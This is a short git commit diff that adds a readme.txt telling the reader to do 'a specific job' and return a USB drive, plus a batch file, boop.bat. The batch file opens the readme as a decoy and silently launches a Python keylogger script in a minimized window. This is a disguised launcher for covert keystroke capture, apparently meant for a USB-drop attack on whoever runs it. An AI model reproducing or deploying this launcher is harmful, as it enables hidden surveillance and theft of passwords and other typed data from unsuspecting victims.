b50b0db47e8c843bb28ee009ef85725f8400e581
j <jgautama7@gmail.com>
2024-11-10 15:35:16 -0600

    Ihopethisworks

---
+++ TESTn2/zz099-qqzi1zz20629/readme.txt
@@ -0,0 +1,3 @@
+You have a specific job.
+Do this specific job.
+Then give me back the usb after you finished this specific job.
---
+++ TESTn2/zz099-qqzi1zz20629/support/boop.bat
@@ -0,0 +1,3 @@
+@echo off
+start "" "C:\TESTn2\zz099-qqzi1zz20629\readme.txt"
+start /min python "C:\TESTn2\655-rezon889033\a\abin\keylogger4.py"
